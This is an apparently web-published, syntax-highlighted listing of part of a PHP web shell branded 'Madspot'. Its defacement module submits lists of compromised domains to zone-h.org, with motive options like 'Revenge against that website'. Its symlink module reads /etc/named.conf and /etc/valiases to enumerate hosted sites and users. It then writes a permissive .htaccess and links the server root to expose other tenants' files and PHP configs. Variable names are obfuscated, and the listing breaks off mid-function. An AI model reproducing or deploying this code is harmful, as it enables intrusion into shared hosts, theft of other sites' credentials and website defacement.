<span class="lineno">1259</span> <span class="s1">&amp;lt;option value=&quot;3&quot; &amp;gt;configuration / admin. mistake&amp;lt;/option&amp;gt;</span>
<span class="lineno">1260</span> <span class="s1">&amp;lt;option value=&quot;4&quot; &amp;gt;brute force attack&amp;lt;/option&amp;gt;</span>
<span class="lineno">1261</span> <span class="s1">&amp;lt;option value=&quot;5&quot; &amp;gt;social engineering&amp;lt;/option&amp;gt;</span>
<span class="lineno">1262</span> <span class="s1">&amp;lt;option value=&quot;6&quot; &amp;gt;Web Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1263</span> <span class="s1">&amp;lt;option value=&quot;7&quot; &amp;gt;Web Server external module intrusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1264</span> <span class="s1">&amp;lt;option value=&quot;8&quot; &amp;gt;Mail Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1265</span> <span class="s1">&amp;lt;option value=&quot;9&quot; &amp;gt;FTP Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1266</span> <span class="s1">&amp;lt;option value=&quot;10&quot; &amp;gt;SSH Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1267</span> <span class="s1">&amp;lt;option value=&quot;11&quot; &amp;gt;Telnet Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1268</span> <span class="s1">&amp;lt;option value=&quot;12&quot; &amp;gt;RPC Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1269</span> <span class="s1">&amp;lt;option value=&quot;13&quot; &amp;gt;Shares misconfiguration&amp;lt;/option&amp;gt;</span>
<span class="lineno">1270</span> <span class="s1">&amp;lt;option value=&quot;14&quot; &amp;gt;Other Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1271</span> <span class="s1">&amp;lt;option value=&quot;15&quot; &amp;gt;SQL Injection&amp;lt;/option&amp;gt;</span>
<span class="lineno">1272</span> <span class="s1">&amp;lt;option value=&quot;16&quot; &amp;gt;URL Poisoning&amp;lt;/option&amp;gt;</span>
<span class="lineno">1273</span> <span class="s1">&amp;lt;option value=&quot;17&quot; &amp;gt;File Inclusion&amp;lt;/option&amp;gt;</span>
<span class="lineno">1274</span> <span class="s1">&amp;lt;option value=&quot;18&quot; &amp;gt;Other Web Application bug&amp;lt;/option&amp;gt;</span>
<span class="lineno">1275</span> <span class="s1">&amp;lt;option value=&quot;19&quot; &amp;gt;Remote administrative panel access bruteforcing&amp;lt;/option&amp;gt;</span>
<span class="lineno">1276</span> <span class="s1">&amp;lt;option value=&quot;20&quot; &amp;gt;Remote administrative panel access password guessing&amp;lt;/option&amp;gt;</span>
<span class="lineno">1277</span> <span class="s1">&amp;lt;option value=&quot;21&quot; &amp;gt;Remote administrative panel access social engineering&amp;lt;/option&amp;gt;</span>
<span class="lineno">1278</span> <span class="s1">&amp;lt;option value=&quot;22&quot; &amp;gt;Attack against administrator(password stealing/sniffing)&amp;lt;/option&amp;gt;</span>
<span class="lineno">1279</span> <span class="s1">&amp;lt;option value=&quot;23&quot; &amp;gt;Access credentials through Man In the Middle attack&amp;lt;/option&amp;gt;</span>
<span class="lineno">1280</span> <span class="s1">&amp;lt;option value=&quot;24&quot; &amp;gt;Remote service password guessing&amp;lt;/option&amp;gt;</span>
<span class="lineno">1281</span> <span class="s1">&amp;lt;option value=&quot;25&quot; &amp;gt;Remote service password bruteforce&amp;lt;/option&amp;gt;</span>
<span class="lineno">1282</span> <span class="s1">&amp;lt;option value=&quot;26&quot; &amp;gt;Rerouting after attacking the Firewall&amp;lt;/option&amp;gt;</span>
<span class="lineno">1283</span> <span class="s1">&amp;lt;option value=&quot;27&quot; &amp;gt;Rerouting after attacking the Router&amp;lt;/option&amp;gt;</span>
<span class="lineno">1284</span> <span class="s1">&amp;lt;option value=&quot;28&quot; &amp;gt;DNS attack through social engineering&amp;lt;/option&amp;gt;</span>
<span class="lineno">1285</span> <span class="s1">&amp;lt;option value=&quot;29&quot; &amp;gt;DNS attack through cache poisoning&amp;lt;/option&amp;gt;</span>
<span class="lineno">1286</span> <span class="s1">&amp;lt;option value=&quot;30&quot; &amp;gt;Not available&amp;lt;/option&amp;gt;</span>
<span class="lineno">1287</span> <span class="s1">&amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="lineno">1288</span> <span class="s1">&amp;lt;select  &amp;gt;</span>
<span class="lineno">1289</span> <span class="s1">&amp;lt;option &amp;gt;Not available&amp;lt;/option&amp;gt;</span>
<span class="lineno">1290</span> <span class="s1">&amp;lt;option value=&quot;1&quot; &amp;gt;Heh...just for fun!&amp;lt;/option&amp;gt;</span>
<span class="lineno">1291</span> <span class="s1">&amp;lt;option value=&quot;2&quot; &amp;gt;Revenge against that website&amp;lt;/option&amp;gt;</span>
<span class="lineno">1292</span> <span class="s1">&amp;lt;option value=&quot;3&quot; &amp;gt;Political reasons&amp;lt;/option&amp;gt;</span>
<span class="lineno">1293</span> <span class="s1">&amp;lt;option value=&quot;4&quot; &amp;gt;As a challenge&amp;lt;/option&amp;gt;</span>
<span class="lineno">1294</span> <span class="s1">&amp;lt;option value=&quot;5&quot; &amp;gt;I just want to be the best defacer&amp;lt;/option&amp;gt;</span>
<span class="lineno">1295</span> <span class="s1">&amp;lt;option value=&quot;6&quot; &amp;gt;Patriotism&amp;lt;/option&amp;gt;</span>
<span class="lineno">1296</span> <span class="s1">&amp;lt;option value=&quot;7&quot; &amp;gt;Not available&amp;lt;/option&amp;gt;</span>
<span class="lineno">1297</span> <span class="s1">&amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="lineno">1298</span> <span class="s1">&amp;lt;textarea name=domain cols=&quot;50&quot; rows=&quot;15&quot;&amp;gt;List Of Domains&amp;lt;/textarea&amp;gt;</span>
<span class="lineno">1299</span> <span class="s1">&amp;lt;br&amp;gt;</span>
<span class="lineno">1300</span> <span class="s1">&amp;lt;input type=&quot;submit&quot; value=&quot;&amp;gt;&amp;gt;&quot; /&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1301</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span>
<span class="lineno">1302</span> <span class="p">{</span>
<span class="lineno">1303</span>     <span class="nv">$hacker</span> <span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">];</span>
<span class="lineno">1304</span>     <span class="nv">$method</span> <span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">];</span>
<span class="lineno">1305</span>     <span class="nv">$neden</span> <span class="o">=</span><span class="s2">&quot;Not available&quot;</span><span class="p">;</span>
<span class="lineno">1306</span>     <span class="nv">$site</span> <span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">];</span>
<span class="lineno">1307</span>    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1308</span>    <span class="nv">$sites</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$site</span><span class="p">);</span>
<span class="lineno">1309</span>    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1310</span>    <span class="k">while</span><span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$sites</span><span class="p">))</span> 
<span class="lineno">1311</span>    <span class="p">{</span>
<span class="lineno">1312</span>    <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$sites</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;http&quot;</span><span class="p">)</span> 
<span class="lineno">1313</span>    <span class="p">{</span>
<span class="lineno">1314</span>            <span class="nv">$sites</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span><span class="o">.</span><span class="nv">$sites</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
<span class="lineno">1315</span>    <span class="p">}</span>
<span class="lineno">1316</span>    <span class="nx">ZoneH</span><span class="p">(</span><span class="s2">&quot;http://zone-h.org/notify/single&quot;</span><span class="p">,</span> <span class="nv">$hacker</span><span class="p">,</span> <span class="nv">$method</span><span class="p">,</span> <span class="nv">$neden</span><span class="p">,</span> <span class="nv">$sites</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno">1317</span>    <span class="k">echo</span> <span class="s2">&quot;Site : &quot;</span><span class="o">.</span><span class="nv">$sites</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; Defaced !&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1318</span>    <span class="o">++</span><span class="nv">$i</span><span class="p">;</span>
<span class="lineno">1319</span>    <span class="p">}</span>
<span class="lineno">1320</span>      
<span class="lineno">1321</span>     <span class="s2">&quot;Sending Sites To Zone-H Has Been Completed Successfully !! &amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1322</span> <span class="p">}</span>
<span class="lineno">1323</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1324</span> <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno">1325</span>     
<span class="lineno">1326</span> <span class="p">}</span>
<span class="lineno">1327</span> <span class="k">function</span> <span class="nf">madspot</span><span class="p">()</span>
<span class="lineno">1328</span> <span class="p">{</span>
<span class="lineno">1329</span>     <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno">1330</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=header&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1331</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;</span>
<span class="lineno">1332</span> <span class="s2">    </span>
<span class="lineno">1333</span> <span class="s2">                           |`-:_</span>
<span class="lineno">1334</span> <span class="s2">  ,----....____            |    `+.                                                           </span>
<span class="lineno">1335</span> <span class="s2"> (             ````----....|___   |</span>
<span class="lineno">1336</span> <span class="s2">  \     _                      ````----....____</span>
<span class="lineno">1337</span> <span class="s2">   \    _)  Coded By: Ikram Ali                ```---.._                       </span>
<span class="lineno">1338</span> <span class="s2">    \                                                   \ </span>
<span class="lineno">1339</span> <span class="s2">  )`.\  )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )hh</span>
<span class="lineno">1340</span> <span class="s2">-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `</span>
<span class="lineno">1341</span> <span class="s2">   Madspot is a Team of professional Ethical Hackers From Pakistan.</span>
<span class="lineno">1342</span> <span class="s2">   We have Years of  Experience in  Security, Penetration &amp; Coding </span>
<span class="lineno">1343</span> <span class="s2">   And can Break and Secure.</span>
<span class="lineno">1344</span> <span class="s2">   </span>
<span class="lineno">1345</span> <span class="s2">   Version 1.0</span>
<span class="lineno">1346</span> <span class="s2">   </span>
<span class="lineno">1347</span> <span class="s2">   Contact : http://www.madspot.net</span>
<span class="lineno">1348</span> <span class="s2">   </span>
<span class="lineno">1349</span> <span class="s2">   if you found bug contact our team </span>
<span class="lineno">1350</span> <span class="s2">   </span>
<span class="lineno">1351</span> <span class="s2">   </span>
<span class="lineno">1352</span> 
<span class="lineno">1353</span> 
<span class="lineno">1354</span> <span class="s2">              .=&#39;&#39;=.             </span>
<span class="lineno">1355</span> <span class="s2">             / _  _ \</span>
<span class="lineno">1356</span> <span class="s2">            |  d  b  |</span>
<span class="lineno">1357</span> <span class="s2">            \   /\   / </span>
<span class="lineno">1358</span> <span class="s2">           ,/&#39;-=\/=-&#39;\,</span>
<span class="lineno">1359</span> <span class="s2">          / /        \ \     -----------------------------</span>
<span class="lineno">1360</span> <span class="s2">         | / Zahid    \ |    Madspot Digital Security Team</span>
<span class="lineno">1361</span> <span class="s2">         \/ \ Rasheed/ \/    -----------------------------</span>
<span class="lineno">1362</span> <span class="s2">             &#39;.    .&#39;</span>
<span class="lineno">1363</span> <span class="s2">             _|`~~`|_</span>
<span class="lineno">1364</span> <span class="s2">             /|\  /|\    </span>
<span class="lineno">1365</span> <span class="s2">  </span>
<span class="lineno">1366</span> <span class="s2">       .- &amp;lt;O&amp;gt; -.        .-====-.      ,-------.      .-=&amp;lt;&amp;gt;=-.</span>
<span class="lineno">1367</span> <span class="s2">   /_-\&#39;&#39;&#39;/-_\      / / &#39;&#39; \ \     |,-----.|     /__----__\</span>
<span class="lineno">1368</span> <span class="s2">  |/  o) (o  \|    | | &#39;)(&#39; | |   /,&#39;-----&#39;.\   |/ (&#39;)(&#39;) \|</span>
<span class="lineno">1369</span> <span class="s2">   \   ._.   /      \ \    / /   {_/(&#39;) (&#39;)\_}   \   __   /</span>
<span class="lineno">1370</span> <span class="s2">   ,&amp;gt;-_,,,_-&amp;lt;.       &amp;gt;&#39;=jf=&#39;&amp;lt;     `.   _   .&#39;    ,&#39;--__--&#39;.</span>
<span class="lineno">1371</span> <span class="s2"> / Waqar.Khan  \    /        \     /&#39;-___-&#39;\    /    &lt;img src=&quot;</span><span class="o">/</span><span class="nx">HackingScripts</span><span class="o">/</span><span class="nx">wp</span><span class="o">-</span><span class="nx">includes</span><span class="o">/</span><span class="nx">images</span><span class="o">/</span><span class="nx">smilies</span><span class="o">/</span><span class="nx">icon_neutral</span><span class="o">.</span><span class="nx">gif</span><span class="s2">&quot; alt=&quot;</span><span class="o">:|</span><span class="s2">&quot; class=&quot;</span><span class="nx">wp</span><span class="o">-</span><span class="nx">smiley</span><span class="s2">&quot; /&gt;    \</span>
<span class="lineno">1372</span> <span class="s2">(_)     .     (_)  /  Ikram   \   / M-Usman \  (_)   &lt;img src=&quot;</span><span class="o">/</span><span class="nx">HackingScripts</span><span class="o">/</span><span class="nx">wp</span><span class="o">-</span><span class="nx">includes</span><span class="o">/</span><span class="nx">images</span><span class="o">/</span><span class="nx">smilies</span><span class="o">/</span><span class="nx">icon_neutral</span><span class="o">.</span><span class="nx">gif</span><span class="s2">&quot; alt=&quot;</span><span class="o">:|</span><span class="s2">&quot; class=&quot;</span><span class="nx">wp</span><span class="o">-</span><span class="nx">smiley</span><span class="s2">&quot; /&gt;   (_)</span>
<span class="lineno">1373</span> <span class="s2"> \_-----&#39;____--/  (_)  Ali   (_) (_)_______(_)   |___:|____|</span>
<span class="lineno">1374</span> <span class="s2">  \___________/     |________|     \_______/     | Afrasiab|</span>
<span class="lineno">1375</span> 
<span class="lineno">1376</span> 
<span class="lineno">1377</span> <span class="s2">  </span>
<span class="lineno">1378</span> <span class="s2">  </span>
<span class="lineno">1379</span> <span class="s2">  </span>
<span class="lineno">1380</span> <span class="s2">    &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1381</span>     <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno">1382</span>     
<span class="lineno">1383</span>     <span class="p">}</span>
<span class="lineno">1384</span>     
<span class="lineno">1385</span> <span class="k">function</span> <span class="nf">madsymlink</span><span class="p">()</span>
<span class="lineno">1386</span> <span class="p">{</span>
<span class="lineno">1387</span>     <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno">1388</span>     
<span class="lineno">1389</span> <span class="nv">$IIIIIIIIIIIl</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">];</span>
<span class="lineno">1390</span> <span class="nv">$IIIIIIIIIII1</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$IIIIIIIIIIIl</span> <span class="p">);</span>
<span class="lineno">1391</span> <span class="nv">$IIIIIIIIIIIl</span> <span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$IIIIIIIIIII1</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$IIIIIIIIIII1</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$IIIIIIIIIIIl</span> <span class="p">);</span>  
<span class="lineno">1392</span>     
<span class="lineno">1393</span>     
<span class="lineno">1394</span>     
<span class="lineno">1395</span> 
<span class="lineno">1396</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&amp;lt;script&amp;gt;p1_=p2_=p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;br&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;symlink\&#39;,null,\&#39;website\&#39;,null)&quot;&amp;gt;| Domains | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;symlink\&#39;,null,null,\&#39;whole\&#39;)&quot;&amp;gt;| Whole Server Symlink | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;symlink\&#39;,null,null,null,\&#39;config\&#39;)&quot;&amp;gt;| Config PHP symlink | &amp;lt;/a&amp;gt;&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1397</span>     
<span class="lineno">1398</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;website&#39;</span><span class="p">)</span>
<span class="lineno">1399</span>     <span class="p">{</span>
<span class="lineno">1400</span>         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1401</span>         <span class="nv">$d0mains</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s2">&quot;/etc/named.conf&quot;</span><span class="p">);</span>
<span class="lineno">1402</span>         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$d0mains</span><span class="p">){</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;Cant access this file on server -&amp;gt; [ /etc/named.conf ]&amp;lt;/pre&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1403</span> 
<span class="lineno">1404</span>  
<span class="lineno">1405</span> 
<span class="lineno">1406</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table align=center class=&#39;main&#39;  border=0  &amp;gt;</span>
<span class="lineno">1407</span> 
<span class="lineno">1408</span> <span class="s2">&amp;lt;tr bgcolor=Red&amp;gt;&amp;lt;td&amp;gt;Count&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;domains&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;users&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1409</span> <span class="nv">$count</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">1410</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$d0mains</span> <span class="k">as</span> <span class="nv">$d0main</span><span class="p">){</span>
<span class="lineno">1411</span> 
<span class="lineno">1412</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;zone&quot;</span><span class="p">,</span><span class="nv">$d0main</span><span class="p">)){</span>
<span class="lineno">1413</span> 
<span class="lineno">1414</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">&#39;#zone &quot;(.*)&quot;#&#39;</span><span class="p">,</span> <span class="nv">$d0main</span><span class="p">,</span> <span class="nv">$domains</span><span class="p">);</span>
<span class="lineno">1415</span> 
<span class="lineno">1416</span> <span class="nb">flush</span><span class="p">();</span>
<span class="lineno">1417</span> 
<span class="lineno">1418</span> <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$domains</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">2</span><span class="p">){</span>
<span class="lineno">1419</span> 
<span class="lineno">1420</span> <span class="nv">$user</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="s2">&quot;/etc/valiases/&quot;</span><span class="o">.</span><span class="nv">$domains</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]));</span>
<span class="lineno">1421</span> 
<span class="lineno">1422</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$count</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=http://www.&quot;</span><span class="o">.</span><span class="nv">$domains</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$domains</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">flush</span><span class="p">();</span>
<span class="lineno">1423</span> <span class="nv">$count</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">1424</span> <span class="p">}}}</span>
<span class="lineno">1425</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/center&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1426</span>  <span class="p">}</span>
<span class="lineno">1427</span>  
<span class="lineno">1428</span>  <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;whole&#39;</span><span class="p">)</span>
<span class="lineno">1429</span>  <span class="p">{</span>
<span class="lineno">1430</span>     
<span class="lineno">1431</span>     
<span class="lineno">1432</span>     <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">1433</span>     
<span class="lineno">1434</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1435</span>     
<span class="lineno">1436</span>   
<span class="lineno">1437</span>         
<span class="lineno">1438</span> <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="s1">&#39;sym&#39;</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
<span class="lineno">1439</span> <span class="nv">$IIIIIIIIIIl1</span>  <span class="o">=</span> <span class="s2">&quot;Options all </span><span class="se">\n</span><span class="s2"> DirectoryIndex Sux.html </span><span class="se">\n</span><span class="s2"> AddType text/plain .php </span><span class="se">\n</span><span class="s2"> AddHandler server-parsed .php </span><span class="se">\n</span><span class="s2">  AddType text/plain .html </span><span class="se">\n</span><span class="s2"> AddHandler txt .html </span><span class="se">\n</span><span class="s2"> Require None </span><span class="se">\n</span><span class="s2"> Satisfy Any&quot;</span><span class="p">;</span>
<span class="lineno">1440</span> <span class="nv">$IIIIIIIIII1I</span> <span class="o">=@</span><span class="nb">fopen</span> <span class="p">(</span><span class="s1">&#39;sym/.htaccess&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">);</span>
<span class="lineno">1441</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$IIIIIIIIII1I</span> <span class="p">,</span><span class="nv">$IIIIIIIIIIl1</span><span class="p">);</span>
<span class="lineno">1442</span> <span class="o">@</span><span class="nb">symlink</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;sym/root&#39;</span><span class="p">);</span>
<span class="lineno">1443</span> <span class="nv">$IIIIIIIIIlIl</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="s1">&#39;_FILE_&#39;</span><span class="p">);</span>
<span class="lineno">1444</span>     
<span class="lineno">1445</span>     
<span class="lineno">1446</span> <span class="nv">$IIIIIIIIIllI</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/etc/named.conf&#39;</span><span class="p">);</span>
<span class="lineno">1447</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$IIIIIIIIIllI</span><span class="p">)</span>
<span class="lineno">1448</span> <span class="p">{</span>
<span class="lineno">1449</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;# Cant access this file on server -&amp;gt; [ /etc/named.conf ]&amp;lt;/pre&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1450</span> <span class="p">}</span>
<span class="lineno">1451</span> <span class="k">else</span>
<span class="lineno">1452</span> <span class="p">{</span>
<span class="lineno">1453</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table align=&#39;center&#39; width=&#39;40%&#39; class=&#39;main&#39;&amp;gt;&amp;lt;td&amp;gt;Domains&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Users&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;symlink &amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1454</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$IIIIIIIIIllI</span> <span class="k">as</span> <span class="nv">$IIIIIIIIIll1</span><span class="p">){</span>
<span class="lineno">1455</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">eregi</span><span class="p">(</span><span class="s1">&#39;zone&#39;</span><span class="p">,</span><span class="nv">$IIIIIIIIIll1</span><span class="p">)){</span>
<span class="lineno">1456</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">&#39;#zone &quot;(.*)&quot;#&#39;</span><span class="p">,</span><span class="nv">$IIIIIIIIIll1</span><span class="p">,</span><span class="nv">$IIIIIIIIIl11</span><span class="p">);</span>
<span class="lineno">1457</span> <span class="nb">flush</span><span class="p">();</span>
<span class="lineno">1458</span> <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">2</span><span class="p">){</span>
<span class="lineno">1459</span> <span class="nv">$IIIIIIIII1I1</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="s1">&#39;/etc/valiases/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]));</span>
<span class="lineno">1460</span> <span class="nv">$IIIIIIII1I1l</span> <span class="o">=</span> <span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="p">;</span>
<span class="lineno">1461</span> <span class="o">@</span><span class="nb">symlink</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;sym/root&#39;</span><span class="p">);</span>
<span class="lineno">1462</span> <span class="nv">$IIIIIIII1I1l</span> <span class="o">=</span> <span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1463</span> <span class="nv">$IIIIIIII1I11</span> <span class="o">=</span> <span class="s1">&#39;\.ir&#39;</span><span class="p">;</span>
<span class="lineno">1464</span> <span class="nv">$IIIIIIII1lII</span> <span class="o">=</span> <span class="s1">&#39;\.il&#39;</span><span class="p">;</span>
